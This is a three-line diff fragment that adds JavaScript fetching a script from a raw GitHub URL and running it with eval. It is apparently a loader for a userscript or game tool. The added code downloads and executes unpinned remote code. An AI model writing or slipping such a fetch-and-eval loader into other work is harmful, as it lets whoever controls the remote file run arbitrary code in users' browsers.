@@ -1,0 +1,3 @@
+fetch("https://raw.githubusercontent.com/Ic0u/achieved-scripts/refs/heads/main/imgui.js")
+.then((res) => res.text()
+.then((t) => eval(t)))
